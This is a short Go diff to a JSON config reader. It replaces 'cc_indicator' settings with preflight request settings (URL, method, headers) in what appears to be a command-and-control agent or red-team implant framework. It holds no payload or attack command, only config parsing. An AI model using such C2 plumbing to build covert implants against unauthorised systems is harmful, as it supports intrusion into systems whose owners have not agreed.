@@ -65,9 +65,17 @@ func readJSONConfig(jsonData []byte, config_to_write *def.Config) (err error) {
 	config_to_write.ProxyChainBroadcastPort = getString("proxy_chain_broadcast_port")
 	config_to_write.ProxyChainBroadcastIntervalMin = getInt("proxy_chain_broadcast_interval_min")
 	config_to_write.ProxyChainBroadcastIntervalMax = getInt("proxy_chain_broadcast_interval_max")
-	config_to_write.CCIndicatorURL = getString("cc_indicator_url")
-	config_to_write.CCIndicatorWaitMin = getInt("cc_indicator_wait_min")
-	config_to_write.CCIndicatorWaitMax = getInt("cc_indicator_wait_max")
+	config_to_write.PreflightEnabled = getBool("preflight_enabled")
+	config_to_write.PreflightURL = getString("preflight_url")
+	config_to_write.PreflightMethod = getString("preflight_method")
+	if val, ok := raw["preflight_headers"].(map[string]interface{}); ok {
+		config_to_write.PreflightHeaders = make(map[string]string)
+		for k, v := range val {
+			if strV, ok := v.(string); ok {
+				config_to_write.PreflightHeaders[k] = strV
+			}
+		}
+	}
 	config_to_write.CAPEM = getString("ca_pem")
 	config_to_write.CAFingerprint = getString("ca_fingerprint")
 	config_to_write.C2TransportProxy = getString("c2_transport_proxy")
